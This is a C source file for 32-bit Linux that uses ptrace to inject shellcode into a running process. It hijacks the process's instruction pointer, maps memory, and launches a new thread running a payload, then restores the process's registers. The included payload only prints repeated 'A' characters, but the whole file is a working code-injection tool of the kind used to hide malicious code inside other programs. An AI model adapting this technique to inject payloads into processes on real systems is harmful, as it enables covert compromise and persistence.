/* inject.c */

/* Inject a thread running the shellcode at the end of the payload into another
 * process. Requires ptrace() access. Change the 0xf00 at 'make me 0x10f00' to
 * 0x10f00 and we'll be inside the same thread group. */

#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>

#define BUFSIZE		1024
#define LANDADDR	0x08048000		/* :) */
#define MAGIC			0xBAADD00D
#define PRINT_FIXUP		86
#define PRINT_OFFSET	99

static char shellcode[] = {
	0xbb, 0x00, 0x00, 0xad, 0xde,		/* mov $0xdead0000, %ebx */
	0xb9, 0x00, 0x10, 0x00, 0x00,		/* mov $0x1000, %ecx */
	0xba, 0x05, 0x00, 0x00, 0x00,		/* mov $0x5, %edx */
	0xbe, 0x21, 0x00, 0x00, 0x00,		/* mov $0x21, %esi */
	0xbf, 0xff, 0xff, 0xff, 0xff,		/* mov $0xffffffff, %edi */
	0xbd, 0x00, 0x00, 0x00, 0x00,		/* mov $0x0, %ebp */
	0xb8, 0xc0, 0x00, 0x00, 0x00,		/* mov $0xc0, %eax */
	0xcd, 0x80,											/* int $0x80 */
	0x89, 0xc3,											/* mov %eax, %ebx */
	0xb8, 0x0d, 0xd0, 0xad, 0xba,		/* mov $0xbaadd00d, %eax */
	0xcd, 0x80,											/* int $0x80 */
	0x90, 0x90,											/* padding nops */
};

static char payload[] = {
	0xbb, 0x00, 0x10, 0xad, 0xde,		/* mov $0xdead1000, %ebx */
	0xb9, 0x00, 0x40, 0x00, 0x00,		/* mov $0x4000, %ecx */
	0xba, 0x03, 0x00, 0x00, 0x00,		/* mov $0x3, %edx */
	0xbe, 0x21, 0x00, 0x00, 0x00,		/* mov $0x21, %esi */
	0xbf, 0xff, 0xff, 0xff, 0xff,		/* mov $0xffffffff, %edi */
	0xbd, 0x00, 0x00, 0x00, 0x00,		/* mov $0, %ebp */
	0xb8, 0xc0, 0x00, 0x00, 0x00,		/* mov $0xc0, %eax */
	0xcd, 0x80,											/* int $0x80 */
	0xbb, 0x00, 0x0f, 0x00, 0x00,		/* mov $0xf00, %ebx -- make me 0x10f00! */
	0xb9, 0x00, 0x50, 0xad, 0xde,		/* mov $0xdead5000, %ecx */
	0xba, 0x00, 0x00, 0x00, 0x00,		/* mov $0x0, %edx */
	0xbf, 0x00, 0x00, 0x00, 0x00,		/* mov $0x0, %edi */
	0xb8, 0x78, 0x00, 0x00, 0x00,		/* mov $0x78, %eax */
	0xcd, 0x80,											/* int $0x80 */
	0x85, 0xc0,											/* test %eax, %eax */
	0x74, 0x07,											/* jz child */
	0xb8, 0x0f, 0xd0, 0xad, 0xba,		/* mov $0xbaadd00f, %eax */
	0xcd, 0x80,											/* int 0x80 */
/* child: */
	0xb8, 0x04, 0x00, 0x00, 0x00,		/* movl $0x4, %eax */
	0xbb, 0x01, 0x00, 0x00, 0x00,		/* movl $0x1, %ebx */
	0xb9, 0xFF, 0xFF, 0xFF, 0xFF,		/* movl $FFFFFFFF, %ecx -- fixed later */
	0xba, 0x0d, 0x00, 0x00, 0x00,		/* movl $0xd, %edx */
	0xcd, 0x80,											/* int $0x80 */
	0xeb, 0xe8,											/* jmp -24 */
	0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x0a,
};

static void copyfrom(unsigned int src, void *dest, unsigned int len);
static void copyto(unsigned int dest, const void *src, unsigned int len);

static int pid = 0;

int main(int argc, char *argv[]) {
	pid = atoi(argv[1]);
	char buf[BUFSIZE];
	struct user_regs_struct regs;
	struct user_regs_struct oregs;
	unsigned int old_eip;
	unsigned int scnum;
	int parent_fixup = 0;
	int code_fixup = 0;
	int status = 0;

	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
	wait(NULL);
	/* Time to land code... */
	/* Back up the original contents of the landing area */
	printf("pinject: back up landing area...\n");
	copyfrom(LANDADDR, buf, BUFSIZE);
	/* Copy our shellcode into it */
	printf("pinject: copy %d bytes of shellcode...\n", sizeof(shellcode));
	copyto(LANDADDR, shellcode, sizeof(shellcode));
	/* Grab old eip and set eip to the landing address */
	ptrace(PTRACE_GETREGS, pid, NULL, &oregs);
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	old_eip = regs.eip;
	regs.eip = LANDADDR;
	/* Set up the new eip */
	printf("pinject: set %%eip to 0x%08x...\n", regs.eip);
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
	/* Run the child again (now at our shellcode) */
	printf("pinject: run child...\n");
	ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
	/* Trap on a magic syscall which tells us our shellcode is done */
	while (1) {
		wait(&status);
		scnum = ptrace(PTRACE_PEEKUSR, pid, 4 * ORIG_EAX, NULL);
		ptrace(PTRACE_GETREGS, pid, NULL, &regs);
		printf("pinject: waited, orig_eax=0x%08x, status=%d, eax=%08x\n", scnum, status, regs.eax);
		/* The shellcode is done. This means the address of the payload location is
     * in %ebx. Jump into the payload, and restore the landing area. */
		if (scnum == 0xBAADD00D && code_fixup) {
			unsigned int addr = regs.ebx + PRINT_OFFSET;
			printf("pinject: got magic syscall, copying %d bytes of payload...\n",
						 sizeof(payload));
			payload[PRINT_FIXUP] = (addr & 0xFF);
			payload[PRINT_FIXUP + 1] = ((addr >> 8) & 0xFF);
			payload[PRINT_FIXUP + 2] = ((addr >> 16) & 0xFF);
			payload[PRINT_FIXUP + 3] = ((addr >> 24) & 0xFF);
			copyto(regs.ebx, payload, sizeof(payload));
			copyto(LANDADDR, buf, BUFSIZE);
			regs.eip = regs.ebx;
			printf("pinject: jumping into payload at 0x%08x...\n", regs.eip);
			ptrace(PTRACE_SETREGS, pid, NULL, &regs);
		}
		else if (scnum == 0xBAADD00D && !code_fixup) {
			code_fixup = 1;
			printf("pinject: code fixup ready...\n");
		}
		/* The payload has created its child thread. This is invoked from the PARENT
     * thread so we can restore the context to what it was before we started
     * fucking with it. This has to be called AFTER clone() has created the
     * child thread. */
		else if (scnum == 0xBAADD00F && parent_fixup) {
			printf("pinject: parent syscall exit; done :)\n");
			ptrace(PTRACE_SETREGS, pid, NULL, &oregs);
			break;
		}
		else if (scnum == 0xBAADD00F && !parent_fixup) {
			printf("pinject: parent syscall entry...\n");
			parent_fixup = 1;
		}
		ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
	}

	/* All done! */
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	return 0;
}

static void copyfrom(unsigned int src, void *dest, unsigned int len) {
	int i = 0;
	int val;
	int *d = (int*)dest;
	for (i = 0; i < len / sizeof(int); i++) {
		val = ptrace(PTRACE_PEEKDATA, pid, src + (i * sizeof(int)), NULL);
		d[i] = val;
	}
}

static void copyto(unsigned int dest, const void *src, unsigned int len) {
	int i = 0;
	int val;
	int *s = (int*)src;
	for (i = 0; i < len / sizeof(int); i++) {
		ptrace(PTRACE_POKEDATA, pid, dest + (i * sizeof(int)), s[i]);
	}	
}
